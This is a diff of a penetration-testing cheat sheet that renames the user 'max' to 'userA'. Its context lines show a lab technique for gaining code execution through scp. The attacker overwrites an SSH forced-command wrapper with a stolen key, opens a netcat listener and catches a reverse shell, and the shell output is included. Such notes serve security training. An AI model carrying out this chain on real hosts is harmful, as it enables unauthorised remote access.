@@ -273,7 +273,7 @@ scp -r -i id_rsa john@192.168.214.149:/path/to/file/you/want .
 ````
 ##### RCE with scp
 ````
-kali@kali:~/home/max$ cat scp_wrapper.sh 
+kali@kali:~/home/userA$ cat scp_wrapper.sh 
 #!/bin/bash
 case $SSH_ORIGINAL_COMMAND in
  'scp'*)
@@ -298,13 +298,13 @@ case $SSH_ORIGINAL_COMMAND in
 esac
 ````
 ````
-scp -i .ssh/id_rsa scp_wrapper.sh max@192.168.120.29:/home/max/
+scp -i .ssh/id_rsa scp_wrapper.sh userA@192.168.120.29:/home/userA/
 ````
 ````
 kali@kali:~$ sudo nc -nlvp 443
 ````
 ````
-kali@kali:~/home/max$ ssh -i .ssh/id_rsa max@192.168.120.29
+kali@kali:~/home/userA$ ssh -i .ssh/id_rsa userA@192.168.120.29
 PTY allocation request failed on channel 0
 ACCESS DENIED.
 ````
@@ -312,10 +312,10 @@ ACCESS DENIED.
 connect to [192.168.118.11] from (UNKNOWN) [192.168.120.29] 48666
 bash: cannot set terminal process group (932): Inappropriate ioctl for device
 bash: no job control in this shell
-max@sorcerer:~$ id
+userA@sorcerer:~$ id
 id
-uid=1003(max) gid=1003(max) groups=1003(max)
-max@sorcerer:~$
+uid=1003(userA) gid=1003(userA) groups=1003(userA)
+userA@sorcerer:~$
 ````
 #### Telnet port 23
 ##### Login
